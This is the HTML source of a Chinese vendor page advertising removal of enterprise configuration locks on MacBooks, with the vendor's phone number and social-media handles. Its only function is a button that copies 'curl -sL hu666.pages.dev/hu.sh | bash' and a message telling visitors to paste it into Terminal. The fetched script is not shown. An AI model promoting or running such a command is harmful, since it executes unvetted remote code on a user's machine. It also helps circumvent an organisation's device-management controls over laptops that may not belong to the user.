<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MacBook 服务页面 - 华强北小胡</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: #050505 url('https://images.unsplash.com/photo-1611186871348-b1ce696e52c9?q=80&w=2070') no-repeat center center/cover;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            position: relative;
        }
        body::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0, 0, 0, 0.85);
            z-index: 1;
        }
        .container {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 650px;
            background: rgba(20, 20, 20, 0.65);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 40px;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
        h1 {
            font-size: 2.2rem;
            font-weight: 700;
            margin-bottom: 10px;
            letter-spacing: 1px;
            background: linear-gradient(135deg, #ffffff, #a1a1a1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .subtitle {
            color: #888;
            font-size: 1rem;
            margin-bottom: 30px;
        }
        .copy-btn {
            display: inline-block;
            background: #0071e3;
            color: white;
            padding: 16px 40px;
            font-size: 1.1rem;
            font-weight: 600;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(0, 113, 227, 0.4);
            margin-bottom: 35px;
        }
        .copy-btn:hover {
            background: #147ce5;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(0, 113, 227, 0.6);
        }
        .copy-btn:active {
            transform: translateY(1px);
        }
        .info-card {
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.05);
            border-radius: 16px;
            padding: 25px;
            text-align: left;
            margin-bottom: 20px;
        }
        .info-card h3 {
            text-align: center;
            font-size: 1.3rem;
            color: #d4af37;
            margin-bottom: 15px;
            font-weight: 600;
        }
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
            font-size: 1rem;
            color: #ccc;
        }
        .info-item:last-child { margin-bottom: 0; }
        .info-label { color: #888; }
        .info-value { font-weight: 500; color: #fff; }
        .footer-note {
            font-size: 0.8rem;
            color: #444;
            margin-top: 15px;
        }
        .toast {
            position: fixed;
            top: 20px;
            background: rgba(0, 113, 227, 0.9);
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-weight: 500;
            z-index: 100;
            opacity: 0;
            transform: translateY(-20px);
            transition: all 0.3s ease;
            backdrop-filter: blur(5px);
        }
        .toast.show {
            opacity: 1;
            transform: translateY(0);
        }
        .header-phone {
            position: absolute;
            top: 20px; right: 20px;
            background: rgba(255,255,255,0.08);
            padding: 6px 16px;
            border-radius: 50px;
            font-size: 0.85rem;
            color: #aaa;
            z-index: 10;
        }
    </style>
</head>
<body>

    <div class="header-phone">☎️ 联系电话：186 8233 3383</div>

    <div class="container">
        <h1>欢迎来到我们的 MacBook 服务页面</h1>
        <div class="subtitle">请点击下方按钮复制自动化脚本代码：</div>

        <button class="copy-btn" id="copyBtn" data-code="curl -sL hu666.pages.dev/hu.sh | bash">复制代码指令</button>

        <div class="info-card">
            <h3>华强北小胡，配置锁MacBook专家</h3>
            <div class="info-item">
                <span class="info-label">📲 客服微信：</span>
                <span class="info-value">huhuu-020</span>
            </div>
            <div class="info-item">
                <span class="info-label">🎵 抖音搜索：</span>
                <span class="info-value">华强北小胡</span>
            </div>
            <div class="info-item">
                <span class="info-label">🌟 闲鱼店铺：</span>
                <span class="info-value">福田吴彦祖</span>
            </div>
        </div>

        <div class="footer-note" style="color: #555; font-size: 0.75rem; text-align: center; margin-top: 25px;">
            让一万台企业配置锁MacBook完美重生 • 2026年06月11日
        </div>
    </div>

    <div class="toast" id="toast">✅ 刷机短指令已复制，直接去终端粘贴即可！</div>

    <script>
        document.getElementById('copyBtn').addEventListener('click', function() {
            const codeToCopy = this.getAttribute('data-code');
            
            navigator.clipboard.writeText(codeToCopy).then(() => {
                const toast = document.getElementById('toast');
                toast.classList.add('show');
                setTimeout(() => {
                    toast.classList.remove('show');
                }, 2500);
            }).catch(err => {
                // 兼容低版本或特殊浏览器
                const textArea = document.createElement("textarea");
                textArea.value = codeToCopy;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
                
                const toast = document.getElementById('toast');
                toast.classList.add('show');
                setTimeout(() => {
                    toast.classList.remove('show');
                }, 2500);
            });
        });
    </script>
</body>
</html>
